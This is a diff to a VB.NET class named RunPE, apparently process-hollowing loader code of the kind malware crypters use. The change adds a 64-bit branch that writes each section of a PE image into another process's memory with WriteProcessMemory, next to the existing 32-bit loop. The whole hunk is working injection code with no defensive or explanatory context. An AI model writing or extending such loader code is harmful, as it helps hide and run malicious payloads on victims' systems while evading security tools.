@@ -62,14 +62,24 @@ Public Class RunPE
             GoTo retexit
         End If
 
+        If machineUint = &H14C Then
+            For i = 0 To NumberOfSections - 1
+                Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS32) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
+                Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
+                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
+                    GoTo retexit
+                End If
+            Next
+        Else
+            For i = 0 To NumberOfSections - 1
+                Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS64) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
+                Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
+                If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
+                    GoTo retexit
+                End If
+            Next
+        End If
 
-        For i = 0 To NumberOfSections - 1
-            Dim imageSectionPtr As IntPtr = IntPtr.Add(baseAddress, dosHeader.e_lfanew + Marshal.SizeOf(New IMAGE_NT_HEADERS32) + i * Marshal.SizeOf(New IMAGE_SECTION_HEADER))
-            Dim section As IMAGE_SECTION_HEADER = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
-            If Not WriteProcessMemory(hHandle, IntPtr.Add(pImageBase, section.VirtualAddress), IntPtr.Add(baseAddress, section.PointerToRawData), section.SizeOfRawData, IntPtr.Zero) Then
-                GoTo retexit
-            End If
-        Next
 
         Dim ptr As IntPtr = Marshal.AllocHGlobal(8)
         Marshal.WriteInt64(ptr, ImageBase)
